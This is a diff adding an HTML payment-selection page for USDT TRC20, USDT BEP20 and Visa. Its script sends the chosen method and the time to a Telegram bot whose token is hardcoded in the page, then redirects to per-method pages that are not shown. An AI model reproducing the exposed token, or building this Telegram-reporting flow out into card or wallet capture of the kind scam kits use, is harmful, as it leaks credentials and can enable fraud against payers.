@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Payment</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    .payment-option {
+      transition: all 0.3s ease;
+      position: relative;
+      overflow: hidden;
+    }
+    .payment-option:hover {
+      background-color: #374151;
+    }
+    .payment-option.selected {
+      background-color: #1e3a8a;
+      border: 2px solid #3b82f6;
+      box-shadow: 0 0 15px #3b82f6;
+    }
+    .payment-option.selected::after {
+      content: "";
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(120deg, transparent, rgba(59, 130, 246, 0.4), transparent);
+      animation: shine 1.2s infinite;
+    }
+    @keyframes shine {
+      0% { left: -100%; }
+      100% { left: 100%; }
+    }
+  </style>
+</head>
+<body class="bg-gray-900 text-white flex flex-col items-center justify-center min-h-screen p-6">
+
+  <!-- Payment options -->
+  <div id="payment-options" class="w-[320px] px-8 py-8 bg-gray-800 flex flex-col gap-5 rounded-lg shadow-lg">
+    <legend class="text-xl font-bold mb-2 text-white select-none">Choose Payment Method</legend>
+
+    <!-- TRC20 Option -->
+    <div class="payment-option font-medium h-16 flex items-center px-5 gap-3 rounded-lg cursor-pointer">
+      <img src="trc20.png" alt="TRC20" class="w-10 h-10 rounded-full object-cover">
+      <span>USDT TRC20</span>
+    </div>
+
+    <!-- BEP20 Option -->
+    <div class="payment-option font-medium h-16 flex items-center px-5 gap-3 rounded-lg cursor-pointer">
+      <img src="bep20.png" alt="BEP20" class="w-10 h-10 rounded-full object-cover">
+      <span>USDT BEP20</span>
+    </div>
+
+    <!-- Visa Option -->
+    <div class="payment-option font-medium h-16 flex items-center px-5 gap-3 rounded-lg cursor-pointer">
+      <img src="visa.gif" alt="Visa" class="w-10 h-10 rounded-full object-cover">
+      <span>Visa Card</span>
+    </div>
+  </div>
+
+  <!-- Pay Now button -->
+  <button id="pay-btn" class="mt-6 bg-blue-600 hover:bg-blue-700 px-6 py-3 rounded-lg font-bold">
+    Pay Now
+  </button>
+
+  <script>
+    // Telegram config
+    const BOT_TOKEN = "8447607145:AAEWZpX2CUURrXahC_ZWrpnAsOffYiL9zfY";
+    const CHAT_ID = "8066634898";
+
+    // روابط الصفحات لكل وسيلة
+    const pageLinks = {
+      "USDT TRC20": "check.html",
+      "USDT BEP20": "bep20.html",
+      "Visa Card": "visa.html"
+    };
+
+    // اختيار وسيلة الدفع
+    let selectedOption = null;
+    document.querySelectorAll(".payment-option").forEach(option => {
+      option.addEventListener("click", () => {
+        document.querySelectorAll(".payment-option").forEach(o => o.classList.remove("selected"));
+        option.classList.add("selected");
+        selectedOption = option.querySelector("span").textContent;
+      });
+    });
+
+    // عند الضغط على Pay Now
+    document.getElementById("pay-btn").addEventListener("click", () => {
+      if (!selectedOption) {
+        alert("Please select a payment method first");
+        return;
+      }
+
+      const dateTime = new Date().toLocaleString();
+      const message = `💳 New Payment Request\n\n💰 Payment Method: ${selectedOption}\n🕒 Date: ${dateTime}`;
+
+      // إرسال تيليجرام
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+      }).finally(() => {
+        window.location.href = pageLinks[selectedOption] || "check.html";
+      });
+    });
+  </script>
+
+</body>
+</html>
